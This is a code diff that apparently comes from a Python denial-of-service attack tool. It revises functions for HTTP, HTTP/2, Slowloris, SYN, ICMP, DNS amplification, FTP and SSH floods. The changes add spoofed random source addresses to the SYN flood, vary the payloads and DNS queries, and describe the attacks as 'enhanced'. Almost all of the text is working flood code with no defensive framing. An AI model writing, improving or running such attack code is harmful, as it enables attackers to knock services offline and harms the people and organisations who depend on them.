@@ -333,8 +333,8 @@ def is_valid_ip(ip: str):
         return False
 
 async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
-    """Perform a rate-limited attack."""
-    global requests_sent, successful_requests, failed_requests, last_time
+    """Perform an HTTP flood attack with improved concurrency and payload variation."""
+    global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
 
@@ -374,7 +374,7 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                 await asyncio.sleep(pause_time)
 
 async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
-    """Perform a Slowloris attack by keeping many connections open."""
+    """Perform a Slowloris attack with improved connection persistence and dynamic headers."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -410,13 +410,13 @@ async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxi
                 await asyncio.sleep(pause_time)
 
 def syn_flood(target_ip, target_port, duration):
-    """Perform a SYN flood attack using scapy."""
+    """Perform a SYN flood attack with enhanced packet crafting and rate control."""
     print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft a SYN packet using scapy
-            ip_layer = scapy.IP(dst=target_ip)
+            # Craft a SYN packet with random source IP and port
+            ip_layer = scapy.IP(src=f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}", dst=target_ip)
             tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
             packet = ip_layer / tcp_layer
             scapy.send(packet, verbose=False)
@@ -426,13 +426,13 @@ def syn_flood(target_ip, target_port, duration):
     print("SYN flood attack completed.")
 
 def icmp_flood(target_ip, duration):
-    """Perform an ICMP flood attack using scapy."""
+    """Perform an ICMP flood attack with enhanced packet variation and rate control."""
     print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
-            # Craft an ICMP packet using scapy
-            packet = scapy.IP(dst=target_ip) / scapy.ICMP()
+            # Craft an ICMP packet with random payload
+            packet = scapy.IP(dst=target_ip) / scapy.ICMP() / ("X" * random.randint(64, 128))
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during ICMP flood: {e}")
@@ -440,13 +440,15 @@ def icmp_flood(target_ip, duration):
     print("ICMP flood attack completed.")
 
 async def dns_amplification(target_ip, duration):
-    """Perform a DNS amplification attack."""
+    """Perform a DNS amplification attack with enhanced query variation and rate control."""
     print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
+    dns_queries = ["example.com", "google.com", "yahoo.com", "bing.com", "amazon.com"]
     while time.time() - start_time < duration:
         try:
-            # Craft a DNS amplification packet
-            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
+            # Craft a DNS amplification packet with random query
+            query = random.choice(dns_queries)
+            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname=query))
             scapy.send(packet, verbose=False)
         except Exception as e:
             print(f"Error during DNS amplification: {e}")
@@ -454,7 +456,7 @@ async def dns_amplification(target_ip, duration):
     print("DNS amplification attack completed.")
 
 def ftp_flood(target_ip, target_port, duration):
-    """Perform an FTP flood attack."""
+    """Perform an FTP flood attack with improved connection management and payload variation."""
     print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
@@ -463,7 +465,7 @@ def ftp_flood(target_ip, target_port, duration):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target_ip, target_port))
             # Send a random payload
-            sock.send(os.urandom(1024))
+            sock.send(os.urandom(random.randint(512, 1024)))
             sock.close()
         except Exception as e:
             print(f"Error during FTP flood: {e}")
@@ -471,7 +473,7 @@ def ftp_flood(target_ip, target_port, duration):
     print("FTP flood attack completed.")
 
 def ssh_flood(target_ip, target_port, duration):
-    """Perform an SSH flood attack."""
+    """Perform an SSH flood attack with improved connection management and payload variation."""
     print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
@@ -480,7 +482,7 @@ def ssh_flood(target_ip, target_port, duration):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target_ip, target_port))
             # Send a random payload
-            sock.send(os.urandom(1024))
+            sock.send(os.urandom(random.randint(512, 1024)))
             sock.close()
         except Exception as e:
             print(f"Error during SSH flood: {e}")
@@ -488,7 +490,7 @@ def ssh_flood(target_ip, target_port, duration):
     print("SSH flood attack completed.")
 
 async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
-    """Perform an HTTP/2 flood attack."""
+    """Perform an HTTP/2 flood attack with enhanced features and rate limiting."""
     global requests_sent, successful_requests, failed_requests, last_time
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
